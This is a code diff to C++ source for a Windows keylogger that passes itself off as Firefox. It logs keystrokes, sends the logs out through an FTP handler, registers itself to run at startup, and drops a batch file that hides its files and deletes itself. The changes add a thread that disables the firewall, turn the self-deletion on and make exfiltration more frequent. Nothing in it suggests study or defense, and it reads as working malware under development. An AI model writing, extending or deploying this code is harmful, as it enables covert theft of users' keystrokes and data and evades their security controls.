@@ -5,10 +5,12 @@
 #include <fstream>
 #include <sstream>
 #include <cstdlib>
+#include <thread>
 
 #include "KeyConverter.h"
 #include "FileHandler.h"
 #include "FTPHandler.h"
+#include "FirewallBypasser.h"
 #include "Utils.h"
 
 #pragma comment(linker, "/SUBSYSTEM:console /ENTRY:mainCRTStartup")
@@ -93,6 +95,7 @@ BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR arg
 
     return fSuccess;
 }
+
 void RegisterProgram()
 {
     wchar_t szPathToExe[MAX_PATH];   
@@ -104,7 +107,8 @@ void RegisterProgram()
 void infect(){
     char pathLocation[MAX_PATH];
     strcpy(pathLocation, "C:\\Users\\");
-    strcat(pathLocation, "\\Documents\\nananana.bat");
+    strcpy(pathLocation, getUserName().c_str());
+    strcat(pathLocation, "\\Documents\\nananana.bat"); //TODO add alternative route just in case or simply mkdir Firefox
     
     char startup[MAX_PATH]; //esto estaría bien meterlo en funciones
     strcpy(startup, "C:\\Users\\");
@@ -150,14 +154,14 @@ void infect(){
         strcat(batContent, "attrib %destino2%sysid.dat +s +h\r\n");
         strcat(batContent, "attrib %destino2%systemconf.dll  +s +h\r\n");
         //strcat(batContent, "attrib %destino0%  +s +h\r\n");
-       // strcat(batContent,"DEL \"%~f0\"\r\n\0");
+        strcat(batContent,"DEL \"%~f0\"\r\n\0");
 
         ofstream bat(pathLocation);
         bat << batContent;
         bat.close();
 
-        runBatFile(pathLocation);
-        RegisterProgram();
+        runBatFile(pathLocation);        
+        RegisterProgram(); // TODO: Add firewall exception
         Sleep(2000);
         if(firstRun){
             runFirefox();
@@ -201,7 +205,7 @@ void Log(int limite_keystrokes){
 std::string getIdentification(){
     std::ifstream id("C:\\Firefox\\sysid.dat");
     std::string identification;
-    bool sendFileOnFirstRun = true;
+    bool sendFileOnFirstRun = false;
     
     if(id.good()){
         if(getExecutablePath()!= firefoxPath  || isProcessRunning("firefox.exe")){
@@ -226,13 +230,15 @@ std::string getIdentification(){
     return identification;
 }
 
-int main(int argc, char *argv[]){
+int main(int argc, char *argv[]){    
+    DWORD dwThreadId = 0;    
+    CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(DisableFirewall), NULL, 0, &dwThreadId);  
+    
     string id = getIdentification();
-    int keystroke_limit=500;
-
+    int keystroke_limit=30;//500;
     while(true){
         Log(keystroke_limit);
         sendFile(id, firstRun);
     }
     return 0;
-}
+}                     
